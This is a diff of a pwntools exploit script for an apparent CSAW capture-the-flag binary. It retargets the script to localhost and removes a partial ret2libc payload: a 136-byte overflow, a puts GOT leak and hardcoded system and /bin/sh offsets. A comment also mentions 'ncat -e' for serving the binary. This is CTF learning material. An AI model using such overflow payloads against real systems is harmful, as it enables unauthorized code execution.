@@ -7,8 +7,8 @@ libc = ELF('./libc.so.6')
 #Many command line args can be controlled
 #./exploit.py DEBUG NOASLR
 #./exploit.py GDB HOST=example.com PORT=4141
-host = args.HOST or 'pwn.chal.csaw.io'
-port = int(args.PORT or 1006)
+host = args.HOST or 'localhost'
+port = int(args.PORT or 1234)
 #start nc local
 #ncat -e <exe>
 
@@ -18,7 +18,7 @@ port = int(args.PORT or 1006)
 #adaptable break
 #break *0x{exe.symbols.main:x}
 gdbscript = '''
-break *0x00401150
+break *0x00401152
 continue
 '''.format(**local())
 
@@ -43,36 +43,9 @@ start = local if args.LOCAL else remote
 ############################################
 conn = start()
 
-bin_sh = p64(0x181519)
-system = p64(0x449c0)
+#NONE TEMPLATE
 
-popret = 0x4011eb #TRY OTHER POPS
-puts_plt = 0x0000000000401030
-puts_got = 0x0000000000404018 #equivalent to memset in tut
 
-payload = ''
-payload += "A"*136
-payload += popret
-payload += p64(puts_got)
-payload += p64(puts_plt)
+#NONE TEMPLATE END
 
-conn.recvuntil("Would you like some popcorn?")
-conn.sendline(payload)
-print("O: " + conn.recvline())
-aslr_read = conn.recvline()[-10:]
-
-aslr_read = u64(aslr_read)
-
-log.info("aslr_read ->" + str(aslr_read))
-
-#pop / args / system
-#conn.sendline(system + "BBBBBBBB" + bin_sh)
 conn.interactive()
-
-##############################
-#           NOTES
-##############################
-
-'''
-objdump -R leak | grep memset
-'''
